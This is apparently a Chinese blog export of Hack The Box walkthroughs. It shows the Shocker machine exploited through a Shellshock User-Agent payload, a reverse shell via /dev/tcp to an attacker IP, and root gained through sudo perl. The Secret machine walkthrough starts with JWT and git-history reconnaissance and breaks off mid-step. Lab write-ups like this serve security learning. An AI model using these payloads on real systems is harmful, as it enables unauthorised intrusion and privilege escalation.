class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://shocker.htb/                                            <br> &lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br><br>&lt;h2&gt;Don<span class="hljs-string">&#x27;t Bug Me!&lt;/h2&gt;</span><br><span class="hljs-string">&lt;img src=&quot;bug.jpg&quot; alt=&quot;bug&quot; style=&quot;width:450px;height:350px;&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br></code></pre></td></tr></table></figure><p>路径爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; feroxbuster -u http://shocker.htb -f -n<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://shocker.htb<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🏁  HTTP methods          │ [GET]<br> 🪓  Add Slash             │ <span class="hljs-literal">true</span><br> 🚫  Do Not Recurse        │ <span class="hljs-literal">true</span><br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET        9l       13w      137c http://shocker.htb/<br>403      GET       11l       32w      294c http://shocker.htb/cgi-bin/<br>403      GET       11l       32w      292c http://shocker.htb/icons/<br>403      GET       11l       32w      300c http://shocker.htb/server-status/<br>[<span class="hljs-comment">####################] - 2m     30000/30000   0s      found:4       errors:0      </span><br>[<span class="hljs-comment">####################] - 2m     30000/30000   212/s   http://shocker.htb                                                        </span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt;&gt; feroxbuster -u http:<span class="hljs-regexp">//</span>shocker.htb<span class="hljs-regexp">/cgi-bin/</span> -x sh,cgi,pl<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | <span class="hljs-regexp">/  `    /</span>  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__<span class="hljs-regexp">/ /</span> \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: <span class="hljs-number">2.7</span>.<span class="hljs-number">0</span><br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http:<span class="hljs-regexp">//</span>shocker.htb<span class="hljs-regexp">/cgi-bin/</span><br> 🚀  Threads               │ <span class="hljs-number">50</span><br> 📖  Wordlist              │ <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>raft-medium-directories.txt<br> 👌  Status Codes          │ [<span class="hljs-number">200</span>, <span class="hljs-number">204</span>, <span class="hljs-number">301</span>, <span class="hljs-number">302</span>, <span class="hljs-number">307</span>, <span class="hljs-number">308</span>, <span class="hljs-number">401</span>, <span class="hljs-number">403</span>, <span class="hljs-number">405</span>, <span class="hljs-number">500</span>]<br> 💥  Timeout (secs)        │ <span class="hljs-number">7</span><br> 🦡  User-Agent            │ feroxbuster/<span class="hljs-number">2.7</span>.<span class="hljs-number">0</span><br> 💉  Config File           │ <span class="hljs-regexp">/etc/</span>feroxbuster/ferox-config.toml<br> 💲  Extensions            │ [sh, cgi, pl]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ <span class="hljs-number">4</span><br> 🎉  New Version Available │ https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/epi052/</span>feroxbuster<span class="hljs-regexp">/releases/</span>latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br><span class="hljs-number">403</span>      GET       <span class="hljs-number">11</span>l       <span class="hljs-number">32</span>w      <span class="hljs-number">294</span>c http:<span class="hljs-regexp">//</span>shocker.htb<span class="hljs-regexp">/cgi-bin/</span><br><span class="hljs-number">200</span>      GET        <span class="hljs-number">7</span>l       <span class="hljs-number">18</span>w        <span class="hljs-number">0</span>c http:<span class="hljs-regexp">//</span>shocker.htb<span class="hljs-regexp">/cgi-bin/u</span>ser.sh<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; wget http://shocker.htb/cgi-bin/user.sh<br>--2022-05-18 14:44:55--  http://shocker.htb/cgi-bin/user.sh<br>&gt;&gt; <span class="hljs-built_in">cat</span> user.sh                            <br>Content-Type: text/plain<br><br>Just an <span class="hljs-built_in">uptime</span> <span class="hljs-built_in">test</span> script<br><br> 02:44:55 up 22 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.02, 0.03, 0.00<br> <br>&gt;&gt; <span class="hljs-built_in">uptime</span>                                <br> 14:47:47 up 36 min,  2 <span class="hljs-built_in">users</span>,  load average: 0.06, 0.33, 0.34<br></code></pre></td></tr></table></figure><p>ShellShock：</p><p><a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">ShellShock</a>，又名 Bashdoor 或 CVE-2014-6271，它与用于定义函数的 Bash 语法相关。允许攻击者在做一些安全的事情（例如定义环境变量）的地方执行命令。最初的 POC 是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> x=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo vulnerable&#x27;</span> bash -c <span class="hljs-string">&quot;echo this is a test&quot;</span><br></code></pre></td></tr></table></figure><p>许多不同的程序会接受用户输入并使用它来定义环境变量，其中最著名的是基于 CGI 的 Web 服务器。通常将 User-Agent 字符串存储在环境变量中，需要绝对路径。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">() &#123; :;&#125;;echo; <span class="hljs-regexp">/usr/</span>bin/id<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cgi-bin/user.sh</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>shocker.htb<br>User-Agent:() &#123; :;&#125;;echo; /usr/bin/id<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>返回包便会这样：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Wed, 18 May 2022 07:00:29 GMT<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache/2.4.18 (Ubuntu)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/x-sh<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>129<br><br><span class="language-apache"><span class="hljs-attribute">uid</span>=<span class="hljs-number">1000</span>(shelly) gid=<span class="hljs-number">1000</span>(shelly) groups=<span class="hljs-number">1000</span>(shelly),<span class="hljs-number">4</span>(adm),<span class="hljs-number">24</span>(cdrom),<span class="hljs-number">30</span>(dip),<span class="hljs-number">46</span>(plugdev),<span class="hljs-number">110</span>(lxd),<span class="hljs-number">115</span>(lpadmin),<span class="hljs-number">116</span>(sambashare)</span><br><span class="language-apache"></span><br></code></pre></td></tr></table></figure><p>Nmap有一个专门扫描该漏洞的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh shocker.htb <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 15:03 CST<br>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 0.00% <span class="hljs-keyword">done</span><br>Nmap scan report <span class="hljs-keyword">for</span> shocker.htb (10.10.10.56)<br>Host is up (0.22s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-shellshock: <br>|   VULNERABLE:<br>|   HTTP Shellshock vulnerability<br>|     State: VULNERABLE (Exploitable)<br>|     IDs:  CVE:CVE-2014-6271<br>|       This web application might be affected by the vulnerability known<br>|       as Shellshock. It seems the server is executing commands injected<br>|       via malicious HTTP headers.<br>|             <br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-09-24<br>|     References:<br>|       http://seclists.org/oss-sec/2014/q3/685<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169<br>|_      http://www.openwall.com/lists/oss-security/2014/09/24/10<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.75 seconds<br></code></pre></td></tr></table></figure><p>可以反弹shell：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cgi-bin/user.sh</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>shocker.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>() &#123; :;&#125;; /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.10.56] 51648<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>shelly@Shocker:/usr/lib/cgi-bin$ <span class="hljs-built_in">cd</span> ~<br>shelly@Shocker:/home/shelly$ <span class="hljs-built_in">ls</span><br>user.txt<br>shelly@Shocker:/home/shelly$ <span class="hljs-built_in">cat</span> user.txt <br>2e................................<br></code></pre></td></tr></table></figure><p>sudo可以直接不需要密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">shelly@Shocker:/home/shelly$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> shelly on Shocker:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User shelly may run the following commands on Shocker:<br>    (root) NOPASSWD: /usr/bin/perl<br>shelly@Shocker:/home/shelly$ sudo perl -e <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;&#x27;</span><br>root@Shocker:/home/shelly<span class="hljs-comment"># cat /root/root.txt </span><br>52............................................<br>root@Shocker:/home/shelly<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Secret-JWT</title>
    <link href="/post/HackTheBox-Secret.html"/>
    <url>/post/HackTheBox-Secret.html</url>
    
    <content type="html"><![CDATA[<h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h3><h4 id="Msscan"><a href="#Msscan" class="headerlink" title="Msscan:"></a>Msscan:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-15 08:34:54 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.120                                    <br>Discovered open port 22/tcp on 10.10.11.120                                    <br>Discovered open port 3000/tcp on 10.10.11.120 <br></code></pre></td></tr></table></figure><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 17:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.120<br>Host is up (0.20s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)<br>|   256 95:ed:65:8d:<span class="hljs-built_in">cd</span>:08:2b:55:<span class="hljs-built_in">dd</span>:17:51:31:1e:3e:18:12 (ECDSA)<br>|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)<br>80/tcp   open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: DUMB Docs<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>3000/tcp open  http    Node.js (Express middleware)<br>|_http-title: DUMB Docs<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 26.31 seconds<br></code></pre></td></tr></table></figure><h4 id="WhatWeb"><a href="#WhatWeb" class="headerlink" title="WhatWeb:"></a>WhatWeb:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://secret.htb/                                           <br>http://secret.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.120], Lightbox, Meta-Author[Xiaoying Riley at 3rd Wave Media], Script, Title[DUMB Docs], X-Powered-By[Express], X-UA-Compatible[IE=edge], nginx[1.18.0]<br></code></pre></td></tr></table></figure><h4 id="Port-80："><a href="#Port-80：" class="headerlink" title="Port 80："></a>Port 80：</h4><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515164810811.png" alt="image-20220515164810811"  /><p>一个在线文档搜索，输入名称会进行搜索，可能存在注入。还要一个用户名，以及一个软件源码包：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515164458949.png" alt="image-20220515164458949"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[17:47:18] Starting: <br>[17:48:15] 200 -   93B  - /api<br>[17:48:15] 200 -   93B  - /api/<br>[17:48:15] 200 -   93B  - /api/jsonws/invoke<br>[17:48:15] 200 -   93B  - /api/2/explore/<br>[17:48:15] 200 -   93B  - /api/error_log<br>[17:48:15] 200 -   93B  - /api/jsonws<br>[17:48:15] 200 -   93B  - /api/2/issue/createmeta<br>[17:48:15] 200 -   93B  - /api/login.json<br>[17:48:15] 200 -   93B  - /api/package_search/v4/documentation<br>[17:48:15] 200 -   93B  - /api/swagger<br>[17:48:15] 200 -   93B  - /api/swagger.yml<br>[17:48:15] 200 -   93B  - /api/swagger-ui.html<br>[17:48:15] 200 -   93B  - /api/v3<br>[17:48:15] 200 -   93B  - /api/v2<br>[17:48:15] 200 -   93B  - /api/v2/helpdesk/discover<br>[17:48:15] 200 -   93B  - /api/v1<br>[17:48:18] 301 -  179B  - /assets  -&gt;  /assets/<br>[17:48:37] 200 -   20KB - /docs/<br>[17:48:37] 200 -   20KB - /docs<br>[17:48:38] 301 -  183B  - /download  -&gt;  /download/<br></code></pre></td></tr></table></figure><p>有很多垃圾信息，跟源码目录对不上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">ls</span><br>index.js  model  node_modules  package.json  package-lock.json  public  routes  src  validations.js<br></code></pre></td></tr></table></figure><p>然后还会有官方文档：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">POST http://localhost:3000/api/user/register <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"> &#123;<br><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;dasith&quot;</span>,<br><span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;root@dasith.works&quot;</span>,<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;Kekc8swFgD6zU&quot;</span><br> &#125;<br></code></pre></td></tr></table></figure><p>看起来像是注册，还有一个登录：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">POST http://localhost:3000/api/user/login <br></code></pre></td></tr></table></figure><h4 id="Port-3000"><a href="#Port-3000" class="headerlink" title="Port 3000:"></a>Port 3000:</h4><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515172309253.png" alt="image-20220515172309253"  /><p>3000与80端口一样，官方文档提到的注册页面无法直接访问，可以通过curl：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;admin@secret.htb&quot;,&quot;password&quot;:&quot;password&quot;&#125;&#x27;</span> -X POST http://secret.htb/api/user/register -H <span class="hljs-string">&#x27;Content-Type: Application/json&#x27;</span><br><span class="hljs-string">&quot;name&quot;</span> length must be at least 6 characters long <br></code></pre></td></tr></table></figure><p>名字必须大于六个字符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;:&quot;mosaic&quot;,&quot;email&quot;:&quot;mosaic@outlook.com&quot;,&quot;password&quot;:&quot;password&quot;&#125;&#x27;</span> -X POST http://secret.htb/api/user/register -H <span class="hljs-string">&#x27;Content-Type: Application/json&#x27;</span><br>&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;mosaic&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>看起来注册成功了，可以尝试访问登录页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -d <span class="hljs-string">&#x27;&#123;&quot;email&quot;:&quot;mosaic@outlook.com&quot;,&quot;password&quot;:&quot;password&quot;&#125;&#x27;</span> -X POST http://secret.htb/api/user/login -H <span class="hljs-string">&#x27;Content-Type: Application/json&#x27;</span><br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoibW9zYWljIiwiZW1haWwiOiJtb3NhaWNAb3V0bG9vay5jb20iLCJpYXQiOjE2NTI2MDcxOTJ9.AxIpctQ-eyrU79TD3EK9IAcX9tCBRMosgrnxZFsmMOw<br></code></pre></td></tr></table></figure><p>会获取到一串编码字符串，尝试解码会把头解出来,是JWT令牌：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjgwYzg0ZTNjYjI2YjA0NjQwZjA2MDgiLCJuYW1lIjoibW9zYWljIiwiZW1haWwiOiJtb3NhaWNAb3V0bG9vay5jb20iLCJpYXQiOjE2NTI2MDcxOTJ9.AxIpctQ-eyrU79TD3EK9IAcX9tCBRMosgrnxZFsmMOw |<span class="hljs-built_in">base64</span> -d<br>&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;HS256&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>&#125;<span class="hljs-built_in">base64</span>: 输入无效<br></code></pre></td></tr></table></figure><p>可以到JWT官网去解码：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;6280c84e3cb26b04640f0608&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;mosaic&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;mosaic@outlook.com&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1652607192</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>如果要伪造JWT令牌的话，我需要密钥，或许会藏在我下载的源码中，源码文件中没找到，但是在.git目录里，可以查看git目录，会发现出于安全原因删除了 .env 的提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">ls</span> -a  <br>.   .<span class="hljs-built_in">env</span>  index.js  node_modules  package-lock.json  routes  validations.js<br>..  .git  model     package.json  public             src<br>&gt;&gt; <span class="hljs-built_in">cd</span> .git<br>&gt;&gt; git <span class="hljs-built_in">log</span> --oneline<br>e297a27 (HEAD -&gt; master) now we can view logs from server 😃<br>67d8da7 removed .<span class="hljs-built_in">env</span> <span class="hljs-keyword">for</span> security reasons<br>de0a46b added /downloads<br>4e55472 removed swap<br>3a367e7 added downloads<br>55fe756 first commit<br></code></pre></td></tr></table></figure><p>可以看一眼对应事件：</p><figure class="highlight bash"><table><tr><td 